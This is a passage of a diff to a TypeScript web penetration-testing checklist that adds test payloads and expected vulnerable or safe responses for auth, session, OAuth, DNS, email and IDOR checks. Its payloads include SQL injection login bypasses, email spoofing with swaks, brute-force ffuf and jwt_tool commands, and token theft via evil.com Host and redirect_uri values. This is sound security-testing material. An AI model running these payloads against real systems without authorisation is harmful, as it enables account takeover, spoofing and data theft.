         text: "Check Shodan/Censys for exposed assets on the org's IP ranges",
         how: "Search Shodan by organization/ASN to find exposed services outside the main web app scope.",
+        payloads: ["shodan search 'org:\"Example Inc\"'", "censys search 'autonomous_system.name: \"Example Inc\"'"],
+        expectedResponse: {
+          vulnerable: "Shodan/Censys show additional exposed assets (open ports, panels, databases) on the org's IP ranges not found via normal recon.",
+          safe: "Shodan/Censys show no additional exposed assets beyond already-known, hardened hosts.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-osint-7",
         text: "Check public bug bounty writeups for the same target/program",
         how: "Search for previously disclosed reports on the same program to understand recurring weak areas.",
+        payloads: ["site:hackerone.com/reports \"example.com\"", "site:medium.com \"example.com\" bug bounty writeup"],
+        expectedResponse: {
+          vulnerable: "Public writeups for the same program reveal previously-reported vulnerability classes/endpoints that may still be unpatched or have regressed.",
+          safe: "No public writeups exist for the program, or previously reported issues are confirmed fixed.",
+        },
         severity: "info",
       },
       {
@@ -467,6 +739,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Search for exposed internal wiki/Confluence/Jira instances",
         how: "Dork or brute-force common subdomains for internal collaboration tools left publicly accessible.",
         payloads: ["site:example.com inurl:confluence", "jira.example.com"],
+        expectedResponse: {
+          vulnerable: "An internal wiki/Confluence/Jira instance is publicly reachable and browsable without authentication.",
+          safe: "Internal collaboration tools require authentication and are not reachable from the public internet.",
+        },
         severity: "high",
       },
     ],
@@ -482,12 +758,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check SPF record existence and configuration",
         how: "Query the domain's TXT records for an SPF entry and confirm it uses a strict -all (not a permissive ~all/+all).",
         payloads: ["dig TXT example.com | grep spf1"],
+        expectedResponse: {
+          vulnerable: "SPF record is missing or uses a permissive mechanism (e.g. ?all or no all), allowing unauthorized servers to send mail as the domain.",
+          safe: "SPF record exists with a strict -all mechanism and correctly lists all legitimate sending sources.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-email-2",
         text: "Check DKIM record existence and key strength",
         how: "Look up the DKIM selector's TXT record and confirm a sufficiently strong key length is used.",
+        payloads: ["dig TXT selector1._domainkey.example.com"],
+        expectedResponse: {
+          vulnerable: "DKIM record is missing or uses a weak key length (e.g. 512-bit), making signature forgery feasible.",
+          safe: "DKIM is configured with a strong key (2048-bit) and validates correctly.",
+        },
         severity: "low",
       },
       {
@@ -495,18 +780,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check DMARC policy strength",
         how: "Query _dmarc.example.com and confirm the policy is set to reject/quarantine, not none.",
         payloads: ["dig TXT _dmarc.example.com"],
+        expectedResponse: {
+          vulnerable: "DMARC policy is missing or set to p=none, meaning spoofed mail is not rejected/quarantined.",
+          safe: "DMARC policy is set to p=reject or p=quarantine with proper alignment enforced.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-email-4",
         text: "Test for email spoofing due to weak SPF/DMARC",
         how: "Attempt to send a spoofed email as the target domain and check if it lands in the recipient inbox without warning.",
+        payloads: ["swaks --from ceo@example.com --to victim@test.com --server example-mx.com --header 'Subject: Test' --body 'spoof test'"],
+        expectedResponse: {
+          vulnerable: "A spoofed email passing as the domain is deliverable to an inbox without being flagged, confirming weak SPF/DMARC enforcement.",
+          safe: "Spoofed test emails are rejected or land in spam/quarantine due to strict SPF/DKIM/DMARC enforcement.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-email-5",
         text: "Check for subdomain takeover impact on email trust",
         how: "If a subdomain is vulnerable to takeover, evaluate whether it's also used for outbound mail, amplifying spoofing risk.",
+        payloads: ["dig TXT example.com | grep -i 'include:mail.vulnerable-subdomain.example.com'"],
+        expectedResponse: {
+          vulnerable: "A takeover-able subdomain is also a valid SPF-included mail sender, allowing an attacker to send trusted-looking spoofed email after claiming it.",
+          safe: "Takeover-able subdomains (if any) are not included in SPF/DKIM trust chains, so no email trust impact results.",
+        },
         severity: "high",
       },
     ],
@@ -522,30 +821,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for DNS zone transfer vulnerability",
         how: "Attempt an AXFR zone transfer against each authoritative nameserver — a misconfigured server leaks the entire DNS zone.",
         payloads: ["dig axfr @nsX.example.com example.com"],
+        expectedResponse: {
+          vulnerable: "A zone transfer (AXFR) request succeeds and dumps the full DNS zone, revealing internal hostnames and structure.",
+          safe: "The nameserver refuses AXFR from unauthorized hosts, returning a refused/transfer-not-allowed response.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-dns-2",
         text: "Check for DNSSEC implementation",
         how: "Verify whether DNSSEC signing is enabled and correctly validated for the domain.",
+        payloads: ["dig DNSKEY example.com +dnssec", "delv example.com"],
+        expectedResponse: {
+          vulnerable: "DNSSEC is not implemented, meaning DNS responses can be spoofed/cache-poisoned without signature validation.",
+          safe: "DNSSEC is properly implemented and validating resolvers reject unsigned or tampered responses.",
+        },
         severity: "low",
       },
       {
         id: "web-recon-dns-3",
         text: "Check for wildcard DNS misconfiguration",
         how: "Query a random non-existent subdomain; if it resolves, a wildcard record may mask real subdomain enumeration results.",
+        payloads: ["dig randomstring1234abcd.example.com"],
+        expectedResponse: {
+          vulnerable: "A wildcard DNS record causes arbitrary subdomains to resolve to a live host, potentially serving unintended content or masking real subdomain enumeration.",
+          safe: "No wildcard record exists, or wildcard responses are clearly distinguishable and don't serve sensitive content.",
+        },
         severity: "low",
       },
       {
         id: "web-recon-dns-4",
         text: "Check for dangling NS delegation takeover",
         how: "If a subdomain delegates to a nameserver no longer controlled by the intended party, it may be claimable for full subdomain control.",
+        payloads: ["dig NS sub.example.com", "whois <delegated-nameserver-domain>  # check if registrable"],
+        expectedResponse: {
+          vulnerable: "An NS delegation points to a nameserver that can be registered/claimed by an attacker, allowing full DNS control over the delegated zone.",
+          safe: "All delegated nameservers are actively owned and not available for registration.",
+        },
         severity: "critical",
       },
       {
         id: "web-recon-dns-5",
         text: "Check CAA records for certificate issuance restrictions",
         how: "Verify CAA records restrict certificate issuance to expected CAs, reducing risk of rogue cert issuance.",
+        payloads: ["dig CAA example.com"],
+        expectedResponse: {
+          vulnerable: "No CAA record is set, allowing any certificate authority to issue certificates for the domain without restriction.",
+          safe: "A CAA record restricts issuance to specific, authorized certificate authorities.",
+        },
         severity: "low",
       },
     ],
@@ -562,12 +885,22 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-auth-pw-1",
         text: "Test for weak password policy",
         how: "Try registering/changing password to short, common, or no-complexity values and confirm what the server accepts.",
+        payloads: ["123456", "password", "aaaaaa"],
+        expectedResponse: {
+          vulnerable: "The app accepts weak passwords (e.g. \"password1\", 6 characters, no complexity) during registration/password change.",
+          safe: "The app rejects weak passwords, enforcing minimum length and complexity requirements.",
+        },
         severity: "medium",
       },
       {
         id: "web-auth-pw-2",
         text: "Check for username/email enumeration via response timing or messages",
         how: "Compare login/forgot-password responses for valid vs invalid users — differing error text or timing reveals enumeration.",
+        payloads: ["curl -w '%{time_total}\\n' -o /dev/null -s -X POST https://example.com/login -d 'user=admin@example.com&pass=x'", "curl -w '%{time_total}\\n' -o /dev/null -s -X POST https://example.com/login -d 'user=doesnotexist@example.com&pass=x'"],
+        expectedResponse: {
+          vulnerable: "Login/registration/reset responses differ (message text, response time, or status code) between valid and invalid usernames/emails, confirming enumeration.",
+          safe: "Responses are identical in content and timing regardless of whether the account exists.",
+        },
         severity: "medium",
         tags: { relatedItemIds: ["web-auth-login-1"] },
       },
@@ -575,6 +908,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-auth-pw-3",
         text: "Test login rate limiting / brute-force protection",
         how: "Send repeated invalid login attempts for the same account and confirm lockout, CAPTCHA, or backoff kicks in.",
+        payloads: ["ffuf -u https://example.com/login -X POST -d 'user=victim@example.com&pass=FUZZ' -w passwords.txt -H 'Content-Type: application/x-www-form-urlencoded'"],
+        expectedResponse: {
+          vulnerable: "Repeated failed login attempts are not throttled, lockout is absent, and brute-force tools can attempt unlimited credentials.",
+          safe: "After a small number of failed attempts, the account is locked/throttled or a CAPTCHA is triggered, blocking further automated attempts.",
+        },
         severity: "high",
       },
       {
@@ -582,18 +920,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for common/default credentials",
         how: "Try admin/admin, root/root, test/test and other common default combos on all login forms found.",
         payloads: ["admin:admin", "root:root", "test:test"],
+        expectedResponse: {
+          vulnerable: "A common/default credential pair (e.g. admin:admin) successfully authenticates.",
+          safe: "All default/common credential pairs are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-pw-5",
         text: "Test password reset token predictability",
         how: "Request multiple reset tokens and analyze for sequential/short/predictable patterns.",
+        payloads: ["for i in {1..5}; do curl -s -X POST https://example.com/forgot-password -d 'email=test@example.com'; sleep 1; done  # compare issued tokens"],
+        expectedResponse: {
+          vulnerable: "The password reset token is short, sequential, or derived from predictable data (timestamp, user ID), allowing it to be guessed or brute-forced.",
+          safe: "The reset token is a long, cryptographically random value with no discernible pattern.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-pw-6",
         text: "Test password reset token expiry and single-use enforcement",
         how: "Reuse an already-used reset token, or an old one, and confirm it's rejected.",
+        payloads: ["curl -X POST https://example.com/reset-password -d 'token=<already_used_token>&password=NewPass123!'"],
+        expectedResponse: {
+          vulnerable: "An already-used or expired reset token still successfully resets the password.",
+          safe: "Reset tokens are single-use and rejected once expired or already consumed.",
+        },
         severity: "high",
       },
       {
@@ -601,24 +953,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for host header injection in password reset email links",
         how: "Send a manipulated Host header during a reset request and check if the reset link uses the attacker-controlled host.",
         payloads: ["Host: evil.com"],
+        expectedResponse: {
+          vulnerable: "Manipulating the Host header changes the domain embedded in the password reset link, allowing token theft via an attacker-controlled host.",
+          safe: "The application uses a hardcoded/whitelisted domain for reset links regardless of the Host header value.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-pw-8",
         text: "Check for password reuse/history enforcement",
         how: "Try setting the password back to a previously used one and confirm it's rejected if a policy claims to prevent reuse.",
+        payloads: ["curl -X POST https://example.com/change-password -H 'Cookie: session=<token>' -d 'old=CurrentPass1!&new=PreviouslyUsedPass1!'"],
+        expectedResponse: {
+          vulnerable: "The app allows reusing a recently-used or the exact same password with no history check.",
+          safe: "The app rejects a new password that matches recent password history.",
+        },
         severity: "low",
       },
       {
         id: "web-auth-pw-9",
         text: "Test account enumeration via registration form",
         how: "Register with an already-used email and compare the response/timing against a fresh email to check if account existence is disclosed.",
+        payloads: ["curl -X POST https://example.com/register -d 'email=existing@example.com&password=Test123!'", "curl -X POST https://example.com/register -d 'email=brandnew-random@example.com&password=Test123!'"],
+        expectedResponse: {
+          vulnerable: "The registration form reveals whether an email/username is already registered (distinct error message, redirect, or status code).",
+          safe: "The registration form gives an identical response (e.g. \"check your email\") regardless of whether the account already exists.",
+        },
         severity: "low",
       },
       {
         id: "web-auth-pw-10",
         text: "Test weak security question/answer implementation",
         how: "If account recovery uses security questions, check whether answers are guessable/researchable (mother's maiden name, favorite color) or brute-forceable without lockout.",
+        payloads: ["ffuf -u https://example.com/recover -X POST -d 'answer=FUZZ&user=victim' -w common-pet-names.txt"],
+        expectedResponse: {
+          vulnerable: "Security questions are guessable/low-entropy (e.g. \"favorite color\") or allow unlimited attempts, enabling account recovery bypass.",
+          safe: "Security questions are high-entropy, rate-limited, or the feature is not the sole recovery factor.",
+        },
         severity: "medium",
       },
     ],
@@ -633,6 +1004,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-auth-session-1",
         text: "Test session token randomness/predictability",
         how: "Collect multiple session tokens and analyze entropy/patterns; predictable tokens allow session hijacking.",
+        payloads: ["for i in {1..20}; do curl -s -c - https://example.com/login | grep session; done", "burp sequencer  # analyze token entropy"],
+        expectedResponse: {
+          vulnerable: "Session tokens show a predictable pattern (sequential, low entropy, or derivable) across multiple samples.",
+          safe: "Session tokens are long, random, and show no statistical pattern across many samples.",
+        },
         severity: "high",
       },
       {
@@ -640,54 +1016,98 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check Secure and HttpOnly flags on session cookies",
         how: "Inspect Set-Cookie headers — missing Secure allows transmission over HTTP, missing HttpOnly allows JS/XSS theft.",
         payloads: ["curl -I https://example.com/login"],
+        expectedResponse: {
+          vulnerable: "The session cookie is missing the Secure and/or HttpOnly flags, allowing transmission over HTTP and access via JavaScript/XSS.",
+          safe: "The session cookie has both Secure and HttpOnly flags set.",
+        },
         severity: "medium",
       },
       {
         id: "web-auth-session-3",
         text: "Test session fixation",
         how: "Set a known session ID pre-login, then check if the same ID stays valid after authentication.",
+        payloads: ["curl -c cookies.txt -b 'session=ATTACKER_KNOWN_SESSIONID' https://example.com/login -d 'user=victim&pass=secret'", "curl -b 'session=ATTACKER_KNOWN_SESSIONID' https://example.com/account  # check if still valid post-login"],
+        expectedResponse: {
+          vulnerable: "A pre-authentication session ID remains valid and privileged after the victim logs in, confirming session fixation.",
+          safe: "The application issues a brand-new session ID upon successful login, invalidating any pre-auth session.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-session-4",
         text: "Check SameSite attribute on cookies",
         how: "Verify session cookies set SameSite=Lax/Strict to reduce CSRF exposure; note if missing entirely.",
+        payloads: ["curl -I https://example.com/login | grep -i 'set-cookie'"],
+        expectedResponse: {
+          vulnerable: "The cookie has no SameSite attribute (or SameSite=None without Secure), allowing it to be sent on cross-site requests.",
+          safe: "The cookie sets SameSite=Lax or Strict, preventing it from being sent on cross-site requests.",
+        },
         severity: "medium",
       },
       {
         id: "web-auth-session-5",
         text: "Test session invalidation on logout",
         how: "Capture the session token, log out, then replay a request with the old token and confirm it's rejected.",
+        payloads: ["curl -b 'session=<captured_token>' https://example.com/logout", "curl -b 'session=<captured_token>' https://example.com/account  # should now be rejected"],
+        expectedResponse: {
+          vulnerable: "The session token/cookie remains valid and usable after logout.",
+          safe: "The session is invalidated server-side on logout and the old token is rejected on subsequent requests.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-session-6",
         text: "Test concurrent session handling",
         how: "Log in from two clients simultaneously and check if the app allows/detects/limits concurrent sessions as expected by its policy.",
+        payloads: ["curl -c session_a.txt https://example.com/login -d 'user=victim&pass=secret'", "curl -c session_b.txt https://example.com/login -d 'user=victim&pass=secret'", "curl -b session_a.txt https://example.com/account  # check if still valid"],
+        expectedResponse: {
+          vulnerable: "Logging in from a second device/browser does not invalidate or flag the first session, allowing unlimited concurrent sessions.",
+          safe: "The application limits concurrent sessions or notifies/invalidates other sessions on new login.",
+        },
         severity: "low",
       },
       {
         id: "web-auth-session-7",
         text: "Test session timeout enforcement",
         how: "Leave a session idle past the stated timeout window and confirm subsequent requests are rejected.",
+        payloads: ["sleep 1800 && curl -b 'session=<token>' https://example.com/account  # after stated idle timeout"],
+        expectedResponse: {
+          vulnerable: "An idle session remains valid indefinitely with no forced re-authentication.",
+          safe: "The session expires after a defined idle period and requires re-login.",
+        },
         severity: "medium",
       },
       {
         id: "web-auth-session-8",
         text: "Test for session token leakage via Referer header",
         how: "Check if a session token embedded in the URL (not cookie) leaks to third-party resources via the Referer header.",
+        payloads: ["curl -e 'https://example.com/dashboard?sid=abc123token' https://analytics.thirdparty.com/  # check Referer forwarded"],
+        expectedResponse: {
+          vulnerable: "The session token appears in the URL and leaks to third-party sites via the Referer header.",
+          safe: "The session token is not present in the URL, or the Referrer-Policy prevents leakage to external sites.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-session-9",
         text: "Test session puzzling (session variable overloading)",
         how: "Check if a session attribute set during one flow (e.g. a partial-auth or password-reset step) is later reused/trusted by an unrelated flow, letting you skip steps or confuse authentication state.",
+        payloads: ["curl -c cookies.txt https://example.com/forgot-password/verify -d 'code=123456'", "curl -b cookies.txt https://example.com/2fa/verify  # check if session already marked partially-authed"],
+        expectedResponse: {
+          vulnerable: "Session variables set in one flow/role bleed into another (e.g. a leftover admin flag from a prior session context), altering authorization decisions.",
+          safe: "Session variables are properly scoped and reset per flow/role with no cross-contamination.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-session-10",
         text: "Test browser cache weakness for authenticated pages",
         how: "After logging out, use the browser's back button / local cache (not server replay) to check if sensitive pages are still viewable from cache on a shared/public computer.",
+        payloads: ["curl -I https://example.com/account | grep -i 'cache-control\\|pragma'"],
+        expectedResponse: {
+          vulnerable: "Authenticated pages remain viewable via the browser back button/cache after logout on a shared computer.",
+          safe: "Authenticated pages set no-store/no-cache headers, so they are not retrievable from cache after logout.",
+        },
         severity: "low",
       },
     ],
@@ -703,42 +1123,76 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test redirect_uri validation for bypass",
         how: "Try alternate redirect_uri values (subdomain, path traversal, open redirect chaining) to steal auth codes/tokens.",
         payloads: ["redirect_uri=https://evil.com", "redirect_uri=https://example.com.evil.com"],
+        expectedResponse: {
+          vulnerable: "A modified/attacker-controlled redirect_uri (e.g. via subdomain, path traversal, or partial match) is accepted, allowing the auth code/token to be stolen.",
+          safe: "Only an exact match against a pre-registered redirect_uri is accepted; all variations are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-oauth-2",
         text: "Test OAuth state parameter for CSRF",
         how: "Remove or reuse the state parameter during the OAuth flow to check for CSRF-based account linking attacks.",
+        payloads: ["https://example.com/oauth/callback?code=<attacker_code>  # no state param", "https://example.com/oauth/callback?code=<attacker_code>&state=<reused_old_state>"],
+        expectedResponse: {
+          vulnerable: "The OAuth flow completes successfully without a state parameter (or with a static/reused one), allowing CSRF-based account linking.",
+          safe: "A unique, unpredictable state parameter is required and validated per request, blocking CSRF.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-oauth-3",
         text: "Test authorization code reuse",
         how: "Reuse an already-exchanged authorization code and confirm the server rejects it on the second attempt.",
+        payloads: ["curl -X POST https://example.com/oauth/token -d 'grant_type=authorization_code&code=<already_used_code>&client_id=xyz&client_secret=abc'"],
+        expectedResponse: {
+          vulnerable: "A previously-used authorization code is accepted again to obtain a new token.",
+          safe: "A reused authorization code is rejected and the associated tokens/session are revoked.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-oauth-4",
         text: "Test for PKCE downgrade on public clients",
         how: "Attempt the authorization code flow without a code_verifier/code_challenge for a public (mobile/SPA) client that should require PKCE.",
+        payloads: ["https://example.com/oauth/authorize?client_id=spa-client&response_type=code&redirect_uri=https://example.com/cb  # omit code_challenge"],
+        expectedResponse: {
+          vulnerable: "A public client can complete the flow without a valid PKCE code_verifier, or with a bypassable code_challenge_method (plain instead of S256).",
+          safe: "PKCE is enforced (S256 required) and the flow fails without a valid, matching code_verifier.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-oauth-5",
         text: "Test SSO email/account linking without verification",
         how: "Check if logging in via SSO with an unverified email auto-links to an existing local account with that email, enabling account takeover.",
+        payloads: ["// Register an OIDC IdP account with email=victim@example.com (unverified) and complete SSO login flow against target"],
+        expectedResponse: {
+          vulnerable: "An SSO login auto-links to an existing account by email without verifying the identity provider actually verified that email, enabling account takeover.",
+          safe: "The app links accounts only after verifying the IdP asserts a verified email, or requires explicit confirmation before linking.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-oauth-6",
         text: "Test SAML response signature validation",
         how: "Modify a SAML assertion (e.g. change the NameID) without re-signing and confirm the service provider rejects it.",
+        payloads: ["python3 samlraider.py --edit-nameid admin@example.com --resend", "// SAML Raider Burp extension: XML Signature Wrapping / strip signature"],
+        expectedResponse: {
+          vulnerable: "A SAML response with a stripped or altered signature (or signature moved to an unsigned assertion) is still accepted as valid.",
+          safe: "The service rejects any SAML response with an invalid, missing, or improperly-placed signature.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-oauth-7",
         text: "Test for scope escalation in access token requests",
         how: "Request broader OAuth scopes than the client was originally granted and check if the authorization server allows it silently.",
+        payloads: ["https://example.com/oauth/authorize?client_id=xyz&scope=read+write+admin&response_type=code"],
+        expectedResponse: {
+          vulnerable: "A token request can obtain broader scopes than the client was granted/registered for.",
+          safe: "Requested scopes are validated against the client's registered/consented scopes and excess scopes are rejected.",
+        },
         severity: "high",
       },
     ],
@@ -754,6 +1208,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test login with SQL injection in username/password",
         how: "Submit SQLi payloads in login fields to attempt authentication bypass.",
         payloads: ["' OR '1'='1", "admin'--"],
+        expectedResponse: {
+          vulnerable: "A SQLi payload in the username/password field bypasses authentication (e.g. logs in as admin without valid credentials).",
+          safe: "SQLi payloads in login fields are safely parameterized/escaped and produce a normal invalid-credentials response.",
+        },
         severity: "critical",
         tags: { relatedItemIds: ["web-inject-sqli-1"] },
       },
@@ -761,36 +1219,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-auth-login-2",
         text: "Test for 2FA bypass",
         how: "Check if the 2FA step can be skipped by directly navigating to the post-login page, or if OTP responses can be brute-forced.",
+        payloads: ["curl -b 'partial_auth=<token>' https://example.com/dashboard  # skip /2fa step", "ffuf -u https://example.com/2fa/verify -X POST -d 'code=FUZZ' -w 000000-999999.txt -H 'Cookie: partial_auth=<token>'"],
+        expectedResponse: {
+          vulnerable: "The 2FA step can be skipped entirely (e.g. by navigating directly to the post-login page or manipulating a response/status parameter).",
+          safe: "The 2FA step is enforced server-side and cannot be bypassed by direct navigation or client-side manipulation.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-login-3",
         text: "Test for 2FA response manipulation",
         how: "Check if the OTP verification API returns a boolean (success:true/false) that can be tampered with client-side to bypass the check.",
+        payloads: ["{\"success\":false} -> {\"success\":true}", "// Burp Match & Replace: response body \"success\":false -> \"success\":true"],
+        expectedResponse: {
+          vulnerable: "The 2FA verification response (e.g. \"success\":false) can be intercepted and changed to true/200 to bypass the check client-side.",
+          safe: "The server independently verifies the 2FA code and grants access based only on server-side validation, ignoring any client-supplied result.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-login-4",
         text: "Test registration for email verification bypass",
         how: "Try accessing authenticated features immediately after registering, before completing email verification.",
+        payloads: ["curl -c cookies.txt -X POST https://example.com/register -d 'email=x@test.com&password=Test123!'", "curl -b cookies.txt https://example.com/dashboard  # before clicking verification link"],
+        expectedResponse: {
+          vulnerable: "The account is fully functional and usable immediately after registration without ever clicking the verification link.",
+          safe: "Account functionality is restricted until the email verification link is clicked and confirmed server-side.",
+        },
         severity: "high",
       },
       {
         id: "web-auth-login-5",
         text: "Test for account takeover via unverified email change",
         how: "Change the account email and check if the new email is trusted for password reset before it's verified.",
+        payloads: ["curl -b 'session=<token>' -X POST https://example.com/account/email -d 'email=attacker@evil.com'", "curl -X POST https://example.com/forgot-password -d 'email=attacker@evil.com'  # before verifying new email"],
+        expectedResponse: {
+          vulnerable: "Changing the email address does not require re-verification, allowing an attacker to hijack an account by pointing it to their own email.",
+          safe: "Any email change requires confirmation via a link sent to the new address before it takes effect.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-login-6",
         text: "Test for authentication bypass via forced browsing",
         how: "Attempt to directly access post-login/dashboard URLs without ever authenticating.",
+        payloads: ["curl https://example.com/dashboard", "curl https://example.com/admin/settings  # no auth cookie sent"],
+        expectedResponse: {
+          vulnerable: "A protected page/endpoint is reachable directly by URL without a valid authenticated session.",
+          safe: "All protected pages/endpoints redirect to login or return 401/403 when accessed without authentication.",
+        },
         severity: "critical",
       },
       {
         id: "web-auth-login-7",
         text: "Test for JWT-based login bypass (weak secret / alg:none)",
         how: "If login issues a JWT, check for algorithm confusion or weak signing secret that lets you forge a valid token.",
+        payloads: ["jwt_tool <token> -X a", "jwt_tool <token> -C -d rockyou.txt"],
+        expectedResponse: {
+          vulnerable: "A forged JWT (alg:none, or signed with a guessed/weak secret) is accepted, granting login as an arbitrary user.",
+          safe: "The server rejects tokens with alg:none and validates the signature with a strong secret/key, refusing forged tokens.",
+        },
         severity: "critical",
         tags: { relatedItemIds: ["web-adv-jwt-1"] },
       },
@@ -798,6 +1286,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-auth-login-8",
         text: "Test CAPTCHA bypass on login/registration",
         how: "Check if the CAPTCHA response is validated only client-side, reusable, or skippable by omitting the parameter.",
+        payloads: ["curl -X POST https://example.com/login -d 'user=admin&pass=x'  # omit g-recaptcha-response entirely", "curl -X POST https://example.com/login -d 'user=admin&pass=x&g-recaptcha-response='"],
+        expectedResponse: {
+          vulnerable: "The CAPTCHA can be bypassed (omitted parameter, reused token, or client-side-only check), allowing automated submissions.",
+          safe: "The CAPTCHA is enforced server-side on every attempt and cannot be omitted, reused, or bypassed.",
+        },
         severity: "medium",
       },
     ],
@@ -814,42 +1307,77 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-access-idor-1",
         text: "Test IDOR in URL path parameters",
         how: "Change numeric/UUID identifiers in requests (e.g. /users/123/profile -> /users/124/profile) with a lower-privileged session.",
+        payloads: ["curl -b 'session=<low_priv_token>' https://example.com/users/124/profile", "ffuf -u https://example.com/users/FUZZ/profile -w ids.txt -b 'session=<low_priv_token>'"],
+        expectedResponse: {
+          vulnerable: "Changing the ID in the URL path returns another user's data without authorization checks.",
+          safe: "Requesting another user's ID returns 403/404 or an authorization error; only the owner's data is returned.",
+        },
         severity: "high",
       },
       {
         id: "web-access-idor-2",
         text: "Test IDOR with UUID vs sequential integer identifiers",
         how: "Check if any endpoints still accept predictable numeric IDs alongside UUIDs, revealing a legacy insecure path.",
+        payloads: ["curl https://example.com/api/orders/1", "curl https://example.com/api/orders/550e8400-e29b-41d4-a716-446655440000"],
+        expectedResponse: {
+          vulnerable: "Even with UUIDs, a leaked/guessed UUID from another user still returns their data due to missing ownership checks (or sequential IDs are trivially enumerable).",
+          safe: "Access is checked against the authenticated user's ownership regardless of identifier type; foreign IDs are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-access-idor-3",
         text: "Test IDOR in request body/JSON parameters",
         how: "Look beyond the URL — object IDs sent inside JSON bodies (e.g. \"accountId\": 123) are just as often unchecked.",
+        payloads: ["curl -X POST https://example.com/api/invoices -H 'Content-Type: application/json' -b 'session=<low_priv_token>' -d '{\"accountId\":124}'"],
+        expectedResponse: {
+          vulnerable: "Modifying an ID field in the JSON/body request returns or modifies another user's record.",
+          safe: "The server validates ownership of the ID in the body against the authenticated session and rejects mismatches.",
+        },
         severity: "high",
       },
       {
         id: "web-access-idor-4",
         text: "Test IDOR on file/document download endpoints",
         how: "Swap document/invoice/attachment IDs to access files belonging to other users.",
+        payloads: ["curl -b 'session=<low_priv_token>' https://example.com/download?file_id=1002", "ffuf -u https://example.com/download?file_id=FUZZ -w ids.txt -b 'session=<low_priv_token>'"],
+        expectedResponse: {
+          vulnerable: "Changing the file/document ID in a download request retrieves another user's file.",
+          safe: "Download requests are authorized against the requester's ownership of the specific file/document.",
+        },
         severity: "high",
       },
       {
         id: "web-access-idor-5",
         text: "Test IDOR via GraphQL object queries",
         how: "Query the same object type with a different ID/node identifier through GraphQL, bypassing REST-level checks.",
+        payloads: ["{\"query\":\"query{ user(id: \\\"124\\\") { email, address } }\"}", "{\"query\":\"query{ node(id: \\\"VXNlcjoxMjQ=\\\") { ... on User { email } } }\"}"],
+        expectedResponse: {
+          vulnerable: "A GraphQL query for another user's object ID returns their data despite lacking permission.",
+          safe: "GraphQL resolvers enforce per-field/object authorization and return null/error for objects the caller doesn't own.",
+        },
         severity: "high",
       },
       {
         id: "web-access-idor-6",
         text: "Test IDOR in export/bulk-download features",
         how: "Manipulate the target ID or filter parameter in bulk export endpoints to pull other users'/tenants' data.",
+        payloads: ["curl -b 'session=<low_priv_token>' 'https://example.com/api/export?org_id=2&format=csv'"],
+        expectedResponse: {
+          vulnerable: "An export/bulk-download feature includes records belonging to other users/tenants when parameters are manipulated.",
+          safe: "Export/bulk features are scoped strictly to the authenticated user's/tenant's own data regardless of parameters supplied.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-idor-7",
         text: "Test IDOR on DELETE/UPDATE endpoints (not just GET)",
         how: "Confirm write-access IDOR separately — read access being blocked doesn't guarantee write access is too.",
+        payloads: ["curl -X DELETE -b 'session=<low_priv_token>' https://example.com/api/posts/124", "curl -X PUT -b 'session=<low_priv_token>' https://example.com/api/users/124 -d '{\"email\":\"attacker@evil.com\"}'"],
+        expectedResponse: {
+          vulnerable: "A DELETE/UPDATE request using another user's ID succeeds in modifying/deleting their resource.",
+          safe: "DELETE/UPDATE requests are authorized per-resource and fail with 403 when the ID doesn't belong to the requester.",
+        },
         severity: "critical",
       },
     ],
@@ -864,6 +1392,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-access-priv-1",
         text: "Test vertical privilege escalation",
         how: "As a low-privileged user, attempt to access admin-only endpoints directly.",
+        payloads: ["curl -b 'session=<low_priv_token>' https://example.com/admin/users", "curl -b 'session=<low_priv_token>' https://example.com/api/admin/settings"],
+        expectedResponse: {
+          vulnerable: "A lower-privileged user can perform admin-only actions (e.g. by calling the admin endpoint directly), confirming vertical privilege escalation.",
+          safe: "Admin-only endpoints consistently return 403 for non-admin users regardless of how they are accessed.",
+        },
         severity: "critical",
       },
       {
@@ -871,12 +1404,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for role manipulation in request parameters",
         how: "Add or modify a 'role' field in requests (e.g. role=admin) even if not present in the UI.",
         payloads: ["{\"role\":\"admin\"}"],
+        expectedResponse: {
+          vulnerable: "Adding/modifying a role/isAdmin parameter in the request grants elevated privileges.",
+          safe: "Role/privilege fields supplied by the client are ignored server-side; privileges are derived only from the authenticated session's stored role.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-priv-3",
         text: "Test horizontal privilege escalation between tenants",
         how: "In a multi-tenant app, try accessing another tenant's data by changing a tenant/org ID parameter.",
